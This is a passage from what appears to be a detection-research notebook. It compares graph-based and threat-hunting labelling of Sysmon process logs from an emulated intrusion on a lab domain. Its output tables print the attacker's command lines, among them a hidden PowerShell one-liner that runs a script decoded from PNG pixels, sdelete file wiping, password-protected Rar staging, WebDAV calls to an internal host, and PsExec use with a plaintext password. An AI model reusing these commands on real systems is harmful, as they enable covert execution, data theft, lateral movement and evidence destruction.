# 164294       False         True
# 169200       False         True
# 176379       False         True
#
#                                                                                                                                                                                                                                                                                                                                                                                                                           CommandLine
# 1334                                                                                                                                                                                                                                                                                                                                                              .\sdelete64.exe  /accepteula "C:\Users\pbeesly\Desktop\working.zip"
# 8974                                                                                                                                                                                                                                                                                                                                                                               "C:\Program Files\SysinternalsSuite\accesschk.exe"
# 14768                                                                                                                                                                                                                                                                                                                                                                                                                  powershell.exe
# 18627                                                                                                                                                                                                                                                                                                                                                                                                   "C:\Windows\Temp\python.exe"
# 39393                                                                                                                                                                                                                                                                                                                       "C:\Program Files\SysinternalsSuite\sdelete64.exe" /accepteula C:\Users\pbeesly\AppData\Roaming\Draft.Zip
# 56194                                                                                                                                                                                                                                                                                                                                                                                                                  powershell.exe
# 60037                                                                                                                                                                                                                                                                                                                                                                                                                      powershell
# 68686                                                                                                                                                                                                                                                                                                                           "C:\Program Files\SysinternalsSuite\sdelete64.exe" /accepteula C:\programdata\victim\???cod.3aka3.scr
# 72642                                                                                                                                                                                                                                                                                                                                                                                                                      powershell
# 95348                                                                                                                                                                                                                                                                                                                                                                          .\sdelete64.exe  /accepteula "C:\Windows\Temp\Rar.exe"
# 96356   "PowerShell.exe" -noni -noexit -ep bypass -window hidden -c "sal a New-Object;Add-Type -AssemblyName 'System.Drawing'; $g=a System.Drawing.Bitmap('C:\Users\pbeesly\Downloads\monkey.png');$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))"
# 113037                                                                                                                                                                                                                                                                                                                                                                                                  "C:\windows\system32\cmd.exe"
# 120642                                                                                                                                                                                                                                                                                                                                                                                                  "C:\windows\system32\cmd.exe"
# 130522                                                                                                                                                                                                                                                                                                                "C:\Program Files\SysinternalsSuite\sdelete64.exe" /accepteula C:\Users\pbeesly\Downloads\SysinternalsSuite.zip
# 139342                                                                                                                                                                                                                                                                                                                                                                                                                 powershell.exe
# 149429                                                                                                                                                                                                                                                                                                      "C:\Windows\Temp\Rar.exe" a -hpfGzq5yKw C:\Users\pbeesly\Desktop\working.zip C:\Users\pbeesly\AppData\Roaming\working.zip
# 152248                                                                                                                                                                                                                                                                                                                                                                                              C:\Windows\System32\javamtsup.exe
# 160348                                                                                                                                                                                                                                                                                                                                                                                                                     powershell
# 163244                                                                                                                                                                                                                                                                                                                                                                                                    C:\windows\system32\cmd.exe
# 169201                                                                                                                                                                                                                                                                                                                                                      "C:\Windows\System32\control.exe"  /name Microsoft.BackupAndRestoreCenter
# 175284                                                                                                                                                                                                                                                                                                                                                                                                  "C:\Windows\Temp\python.exe"
# 179251                                                                                                                                                                                                                                                                                                                                                                                    "C:\ProgramData\victim\â€®cod.3aka3.scr" /S
# 180127                                                                                                                                                                                                                                                                                                                                                   .\sdelete64.exe  /accepteula "C:\Users\pbeesly\AppData\Roaming\working.zip"
# 41375                                                                                                                                                                                                                                                                                                                                 rundll32.exe C:\windows\system32\davclnt.dll,DavSetCookie 192.168.0.4 http://192.168.0.4/webdav
# 80262                                                                                                                                                                                                                                                                                                                                                                                                   "C:\Windows\Temp\python.exe"
# 83938                                                                                                                                                                                                                                                                                                                                 rundll32.exe C:\windows\system32\davclnt.dll,DavSetCookie 192.168.0.4 http://192.168.0.4/webdav
# 85882                                                                                                                                                                                                                                                                                                                                                                                                   "C:\Windows\Temp\python.exe"
# 146429                                                                                                                                                                                                                                                                                                                                rundll32.exe C:\windows\system32\davclnt.dll,DavSetCookie 192.168.0.4 http://192.168.0.4/webdav
# 149428                                                                                                                                                                                                                                                                                                                                rundll32.exe C:\windows\system32\davclnt.dll,DavSetCookie 192.168.0.4 http://192.168.0.4/webdav
# 162243                                                                                                                                                                                                                                                                                                                                rundll32.exe C:\windows\system32\davclnt.dll,DavSetCookie 192.168.0.4 http://192.168.0.4/webdav
# 196722                                                                                                                                                                                                                                                                                                                                                                                                  "C:\Windows\Temp\python.exe"
# 12975                                                                                                                                                                                                                                                                                                                                                                         \??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1
# 26578                                                                                                                                                                                                                                                                                    "C:\Program Files\SysinternalsSuite\PsExec64.exe" -accepteula \\NASHUA -u dmevals\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\Windows\Temp\python.exe
# 38237                                                                                                                                                                                                                                                                                                                                                                                                "C:\windows\system32\sdclt.exe"
# 63799                                                                                                                                                                                        C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\pbeesly\AppData\Local\Temp\RES2758.tmp" "c:\Users\pbeesly\AppData\Local\Temp\qkbkqqbs\CSC6B76613243A54474837EBEC19BC0E56A.TMP"
# 73611                                                                                                                                                                                         C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\pbeesly\AppData\Local\Temp\RESAB37.tmp" "c:\Users\pbeesly\AppData\Local\Temp\0piklvia\CSC8FB4597E15924B708420DCB4F6EA7BB.TMP"
# 88067                                                                                                                                                                                                                                                                                                                             \\?\C:\windows\system32\conhost.exe --headless --width 80 --height 25 --signal 0x474 --server 0x50c
# 91568                                                                                                                                                                                                                                                                                                                                                                                                                    rundll32.exe
# 104058                                                                                                                                                                                                                                                                                                                                                                        \??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1
# 114981                                                                                                                                                                                                                                                                                                                                 "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Version 5.1 -s -NoLogo -NoProfile
# 115865                                                                                                                                                                                                                                                                                   "C:\Program Files\SysinternalsSuite\PsExec64.exe" -accepteula \\NASHUA -u dmevals\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\Windows\Temp\python.exe
# 117807                                                                                                                                                                                                                                                                                                                                                                                               "C:\windows\system32\sdclt.exe"
# 136222                                                                                                                                                                                                                                                                                   "C:\Program Files\SysinternalsSuite\PsExec64.exe" -accepteula \\NASHUA -u dmevals\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\Windows\Temp\python.exe
# 139343                                                                                                                                                                                                                                                                                                                                                                        \??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1
# 144331                                                                                                                                                                                                                                                                                                                                                                        \??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1
# 147546                                                                                                                                                                                                                                                                                                                                 "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Version 5.1 -s -NoLogo -NoProfile
# 151329                                                                                                                                                                                                                                                                                                                                                                        \??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1
# 154392                                                                                                                                                                                                                                                                                   "C:\Program Files\SysinternalsSuite\PsExec64.exe" -accepteula \\NASHUA -u dmevals\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\Windows\Temp\python.exe
# 154393                                                                                                                                                                                                                                                                                                                                                                                                        C:\windows\PSEXESVC.exe
# 155466                                                                                                                                                                                                                                                                                "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\pbeesly\AppData\Local\Temp\qkbkqqbs\qkbkqqbs.cmdline"
# 157536                                                                                                                                                                                                                                                                                "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\pbeesly\AppData\Local\Temp\0piklvia\0piklvia.cmdline"
# 164294                                                                                                                                                                                                                                                                                                                            \\?\C:\windows\system32\conhost.exe --headless --width 80 --height 25 --signal 0x54c --server 0x540
# 169200                                                                                                                                                                                                                                                                                                                                                                                                  C:\windows\system32\sdclt.exe
# 176379                                                                                                                                                                                                                                                                                                                                                                        \??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1

# %% [markdown]
# ## Graph Advantages

# %%
pd_all_guids.loc[(pd_all_guids['orig_label']==False) & (pd_all_guids['graph_label']==True)].count()
# Out:
# ProcessGuid    23
# Hostname       23
# CommandLine    23
# orig_label     23
# graph_label    23
# dtype: int64

# %%
# The Graph Approach picks up 23 processes not identified in the Threat Hunting Approach
#    Mostly the underlying/support processes: conhost.exe, cvtres.exe, csc.exe
pd_all_guids.loc[(pd_all_guids['orig_label']==False) & (pd_all_guids['graph_label']==True)]
# Out:
#                                    ProcessGuid                Hostname  \
# 12975   {47ab858c-e374-5eac-d903-000000000400}  SCRANTON.dmevals.local
# 26578   {47ab858c-e519-5eac-f403-000000000400}  SCRANTON.dmevals.local
# 38237   {47ab858c-e1e3-5eac-b503-000000000400}  SCRANTON.dmevals.local
# 63799   {47ab858c-e1e5-5eac-bb03-000000000400}  SCRANTON.dmevals.local
# 73611   {47ab858c-e413-5eac-e903-000000000400}  SCRANTON.dmevals.local
# 88067   {47ab858c-e188-5eac-af03-000000000400}  SCRANTON.dmevals.local
# 91568   {47ab858c-e6b2-5eac-5900-000000000500}  SCRANTON.dmevals.local
# 104058  {47ab858c-e394-5eac-e303-000000000400}  SCRANTON.dmevals.local
# 114981  {47ab858c-e3d3-5eac-e603-000000000400}  SCRANTON.dmevals.local
# 115865  {47ab858c-e5a2-5eac-fb03-000000000400}  SCRANTON.dmevals.local
# 117807  {47ab858c-e1e2-5eac-b303-000000000400}  SCRANTON.dmevals.local
# 136222  {47ab858c-e558-5eac-f503-000000000400}  SCRANTON.dmevals.local
# 139343  {5aa8ec29-e5b7-5eac-7803-000000000400}    NASHUA.dmevals.local
# 144331  {47ab858c-e1e4-5eac-b903-000000000400}  SCRANTON.dmevals.local
# 147546  {47ab858c-e394-5eac-e203-000000000400}  SCRANTON.dmevals.local
# 151329  {47ab858c-e23d-5eac-c703-000000000400}  SCRANTON.dmevals.local
# 154392  {47ab858c-e4d6-5eac-f303-000000000400}  SCRANTON.dmevals.local
# 154393  {5aa8ec29-e5b7-5eac-7603-000000000400}    NASHUA.dmevals.local
# 155466  {47ab858c-e1e5-5eac-ba03-000000000400}  SCRANTON.dmevals.local
# 157536  {47ab858c-e413-5eac-e803-000000000400}  SCRANTON.dmevals.local
# 164294  {47ab858c-e144-5eac-aa03-000000000400}  SCRANTON.dmevals.local
# 169200  {47ab858c-e1e2-5eac-b203-000000000400}  SCRANTON.dmevals.local
# 176379  {47ab858c-e3d3-5eac-e703-000000000400}  SCRANTON.dmevals.local
#
#                                                                                                                                                                                                                                      CommandLine  \
# 12975                                                                                                                                                                                    \??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1
# 26578                                                                                               "C:\Program Files\SysinternalsSuite\PsExec64.exe" -accepteula \\NASHUA -u dmevals\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\Windows\Temp\python.exe
# 38237                                                                                                                                                                                                           "C:\windows\system32\sdclt.exe"
# 63799   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\pbeesly\AppData\Local\Temp\RES2758.tmp" "c:\Users\pbeesly\AppData\Local\Temp\qkbkqqbs\CSC6B76613243A54474837EBEC19BC0E56A.TMP"
# 73611    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\pbeesly\AppData\Local\Temp\RESAB37.tmp" "c:\Users\pbeesly\AppData\Local\Temp\0piklvia\CSC8FB4597E15924B708420DCB4F6EA7BB.TMP"
# 88067                                                                                                                                        \\?\C:\windows\system32\conhost.exe --headless --width 80 --height 25 --signal 0x474 --server 0x50c
# 91568                                                                                                                                                                                                                               rundll32.exe
# 104058                                                                                                                                                                                   \??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1
# 114981                                                                                                                                            "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Version 5.1 -s -NoLogo -NoProfile
# 115865                                                                                              "C:\Program Files\SysinternalsSuite\PsExec64.exe" -accepteula \\NASHUA -u dmevals\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\Windows\Temp\python.exe
# 117807                                                                                                                                                                                                          "C:\windows\system32\sdclt.exe"
# 136222                                                                                              "C:\Program Files\SysinternalsSuite\PsExec64.exe" -accepteula \\NASHUA -u dmevals\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\Windows\Temp\python.exe
# 139343                                                                                                                                                                                   \??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1
# 144331                                                                                                                                                                                   \??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1
# 147546                                                                                                                                            "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Version 5.1 -s -NoLogo -NoProfile
# 151329                                                                                                                                                                                   \??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1
# 154392                                                                                              "C:\Program Files\SysinternalsSuite\PsExec64.exe" -accepteula \\NASHUA -u dmevals\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\Windows\Temp\python.exe
# 154393                                                                                                                                                                                                                   C:\windows\PSEXESVC.exe
# 155466                                                                                           "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\pbeesly\AppData\Local\Temp\qkbkqqbs\qkbkqqbs.cmdline"
# 157536                                                                                           "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\pbeesly\AppData\Local\Temp\0piklvia\0piklvia.cmdline"
# 164294                                                                                                                                       \\?\C:\windows\system32\conhost.exe --headless --width 80 --height 25 --signal 0x54c --server 0x540
# 169200                                                                                                                                                                                                             C:\windows\system32\sdclt.exe
# 176379                                                                                                                                                                                   \??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1
#
#         orig_label  graph_label
# 12975        False         True
# 26578        False         True
# 38237        False         True
# 63799        False         True
# 73611        False         True
# 88067        False         True
# 91568        False         True
# 104058       False         True
# 114981       False         True
# 115865       False         True
# 117807       False         True
# 136222       False         True
# 139343       False         True
# 144331       False         True
# 147546       False         True
# 151329       False         True
# 154392       False         True
# 154393       False         True
# 155466       False         True
# 157536       False         True
# 164294       False         True
# 169200       False         True
# 176379       False         True

# %% [markdown]
# # Threat Hunting Explanded Labelling Approach
